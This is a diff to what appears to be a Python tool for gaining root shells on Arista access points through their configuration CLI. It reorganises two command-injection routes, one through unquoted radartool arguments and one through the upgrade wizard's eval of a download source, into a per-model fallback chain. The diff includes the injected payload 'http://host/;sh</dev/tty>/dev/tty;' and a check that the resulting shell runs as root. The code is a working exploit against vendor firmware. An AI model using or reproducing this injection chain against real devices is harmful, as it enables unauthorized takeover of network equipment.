@@ -656,6 +656,10 @@ MODELS = {
         "need_env": ("bootcmd", "ba0", "ba1", "ubootscript"),
         "nor_total": 32 * 1024 * 1024,
         "slot_size": 0x10000000,
+        # 8.9.0-63.1's CLI has no radartool command at all (its /sbin debug
+        # radartool is a netlink-only binary), so do not spend a round trip
+        # asking: the upgrade wizard is the way in on this model.
+        "root_order": ("upgrade", "radartool"),
     },
     "c360": {
         "name": "C-360",
@@ -966,7 +970,7 @@ SOURCE_ECHO_PAT = r"Upgrade from Server/Host \[([^\]]*)\]"
 SHELL_PAT = r"\[config\]\$"
 
 
-def root_via_radartool(pty):
+def _try_radartool(pty, host, payload):
     """A root shell out of the config CLI's radartool command.
 
     The CLI passes radartool's arguments to a shell unquoted, so
@@ -1005,7 +1009,7 @@ def root_via_radartool(pty):
     return True
 
 
-def upgrade_root_shell(pty, host, payload):
+def _upgrade_wizard(pty, host, payload):
     """Drive Arista's own 'upgrade' until it hands back a shell, or stop.
 
     The way in is the download command prep_upgrade.sh builds and evals.  The
@@ -1038,7 +1042,7 @@ def upgrade_root_shell(pty, host, payload):
     first = pty.wait(r"(?:%s)|(?:%s)|(?:%s)" % (SERVER_PAT, SOURCE_ECHO_PAT, CONTINUE_PAT),
                      30, mark=mk)
     if not first:
-        die("'upgrade' offered neither Continue?, a server prompt, nor a source "
+        raise MethodFailed("'upgrade' offered neither Continue?, a server prompt, nor a source "
             "line: offline mode, or a build this tool has not been read on.\n%s"
             % pty.since(mk).strip()[-600:])
 
@@ -1051,7 +1055,7 @@ def upgrade_root_shell(pty, host, payload):
             if pty.wait(sub_pat, 30, mark=mks):
                 pty.send("1")
         if not pty.wait(SERVER_PAT, 30):
-            die("the upgrade flow did not ask for a server address the usual way;\n"
+            raise MethodFailed("the upgrade flow did not ask for a server address the usual way;\n"
                 "run 'upgrade' by hand once and send the full prompt sequence so the\n"
                 "tool can be matched to this build.")
         pty.send(payload)
@@ -1070,7 +1074,7 @@ def upgrade_root_shell(pty, host, payload):
         # A build that echoes the source and then waits for one anyway.
         pty.send(payload)
         if not pty.wait(CONTINUE_PAT, 30):
-            die("no Continue? after the upgrade source:\n%s"
+            raise MethodFailed("no Continue? after the upgrade source:\n%s"
                 % pty.since(mk).strip()[-600:])
         pty.send("y")
         return
@@ -1080,7 +1084,7 @@ def upgrade_root_shell(pty, host, payload):
     # 'upgrade url <source>'.
     pty.send("n")
     if not pty.wait(SHELL_PAT, 20):
-        die("'n' at Continue? did not return to the config shell:\n%s"
+        raise MethodFailed("'n' at Continue? did not return to the config shell:\n%s"
             % pty.since(mk).strip()[-600:])
     line = "upgrade url %s" % payload
     say("  This build echoes the upgrade source instead of reading one, so it is")
@@ -1092,9 +1096,9 @@ def upgrade_root_shell(pty, host, payload):
                    % (CONTINUE_PAT, SHELL_PAT), 30, mark=mk2)
     text = pty.since(mk2)
     if not got:
-        die("'%s' was not answered within 30 s:\n%s" % (line, text.strip()[-600:]))
+        raise MethodFailed("'%s' was not answered within 30 s:\n%s" % (line, text.strip()[-600:]))
     if "Invalid argument" in text:
-        die("this build's 'upgrade' rejected that argument shape:\n%s\n"
+        raise MethodFailed("this build's 'upgrade' rejected that argument shape:\n%s\n"
             "Nothing was written.  Run 'upgrade ?' (or 'help upgrade') and send\n"
             "what it lists, so the tool can be matched to this build.\n%s"
             % (line, text.strip()[-600:]))
@@ -1104,10 +1108,91 @@ def upgrade_root_shell(pty, host, payload):
         if host in src:
             pty.send("y")
             return
-        die("'%s' reached Continue? but the source is still '%s' -- it was not\n"
+        raise MethodFailed("'%s' reached Continue? but the source is still '%s' -- it was not\n"
             "taken, so Continue? was left unanswered.  Nothing was written.\n%s"
             % (line, src, text.strip()[-600:]))
-    die("'%s' was answered unexpectedly:\n%s" % (line, text.strip()[-600:]))
+    raise MethodFailed("'%s' was answered unexpectedly:\n%s" % (line, text.strip()[-600:]))
+
+
+
+class MethodFailed(Exception):
+    """One way in did not produce a shell; the next one is tried."""
+
+
+ROOT_METHOD_USED = None
+
+
+def _cli_back(pty, timeout=20):
+    """Get the config CLI back to its prompt after a method gave up."""
+    try:
+        pty.send("\x03")
+        time.sleep(0.5)
+        pty.send("")
+    except Exception:
+        return False
+    return bool(pty.wait(SHELL_PAT, timeout))
+
+
+def _try_upgrade(pty, host, payload):
+    """Arista's upgrade wizard, then proof that it handed a shell back.
+
+    The wizard's prompts are _upgrade_wizard's business; this adds the two
+    things that decide whether it worked: the AP must not have started a real
+    upgrade from a source it never read, and 'id' must answer as root.
+    """
+    mk0 = pty.mark()
+    _upgrade_wizard(pty, host, payload)
+    time.sleep(10)
+    said = pty.since(mk0)
+    if "Upgrade has started" in said:
+        raise ShellNotReady("Arista started an upgrade from a source it never read: "
+                            "the injected command did not run, so no root shell was "
+                            "handed back.  Nothing was written to this AP.")
+    out, rc = pty.run("id", 120)
+    if "uid=0" not in out:
+        raise ShellNotReady(out[-300:] or "(no output)")
+    return True
+
+
+# The ways in, in the order they are tried.  Each one either returns True with
+# the pty sitting at a root shell, raises MethodFailed with the reason, or
+# raises ShellNotReady when the AP is restarting itself (connect() retries).
+ROOT_METHODS = (
+    ("radartool", "radartool", _try_radartool),
+    ("upgrade", "Arista's upgrade wizard", _try_upgrade),
+)
+
+
+def get_root_shell(pty, host, payload, model):
+    """Try each way in, in this model's order, and say which one worked.
+
+    radartool comes first everywhere: it is a documented CLI command whose
+    arguments reach a shell, rather than an eval inside a download path.  A
+    model can put the wizard first (MODELS[...]["root_order"]) where radartool
+    is known to be absent, which is the C-230 at 8.9.0.
+    """
+    global ROOT_METHOD_USED
+    order = MODELS.get(model, {}).get("root_order") or ("radartool", "upgrade")
+    by_id = {m[0]: m for m in ROOT_METHODS}
+    failures = []
+    for mid in order:                      # the order is the model's, not the tuple's
+        if mid not in by_id:
+            continue
+        _, label, attempt = by_id[mid]
+        try:
+            if attempt(pty, host, payload):
+                ROOT_METHOD_USED = mid
+                say("  root shell via %s." % label)
+                return mid
+        except MethodFailed as e:
+            note("%s: %s" % (label, e))
+            failures.append((label, str(e)))
+        if not _cli_back(pty):
+            failures.append((label, "the config shell did not come back afterwards"))
+            break
+    detail = "\n".join("  %s: %s" % (l, r) for l, r in failures) or "  (no method ran)"
+    die("none of the ways in worked on this build (%s):\n%s"
+        % (MODELS[model]["name"], detail))
 
 
 def _connect_once(host, user=None, password=None):
@@ -1187,31 +1272,16 @@ def _connect_once(host, user=None, password=None):
             break
     m.say("  This AP is an Arista %s, firmware %s." % (MODELS[model]["name"], fw or "?"))
     payload = "http://%s/;sh</dev/tty>/dev/tty;" % host
-    if not root_via_radartool(pty):
-        # radartool is the clean way in; where a build lacks it (or has it
-        # patched), fall back to Arista's own upgrade wizard, which is the
-        # path proven on the C-230 and C-260 at 11.x and the 'upgrade url'
-        # argument form on 16.x/18.x.
-        mk0 = pty.mark()
-        upgrade_root_shell(pty, host, payload)
-        time.sleep(10)
-        say("  root shell via Arista's upgrade wizard.")
-        said = pty.since(mk0)
-        if "Upgrade has started" in said:
-            m.die("Arista started an upgrade from a source it never read: the injected\n"
-                  "command did not run, so no root shell was handed back.  Nothing was\n"
-                  "written to this AP and it stays on its own firmware.  Reboot it and\n"
-                  "run again once this build's source argument is known.\n%s"
-                  % said.strip()[-600:])
-        out, rc = pty.run("id", 120)
-        if "uid=0" not in out:
-            # Drop the session: that is what makes Arista's helper give up and
-            # restart the AP, which is the only way out of this state without hands.
-            try:
-                client.close()
-            except Exception:
-                pass
-            raise ShellNotReady(out[-300:] or "(no output)")
+    try:
+        get_root_shell(pty, host, payload, model)
+    except ShellNotReady:
+        # Dropping the session is what makes Arista's helper give up and restart
+        # the AP, which is the only way out of that state without hands.
+        try:
+            client.close()
+        except Exception:
+            pass
+        raise
     global _STOCK, _STOCK_HOST
     _STOCK = pty
     _STOCK_HOST = host
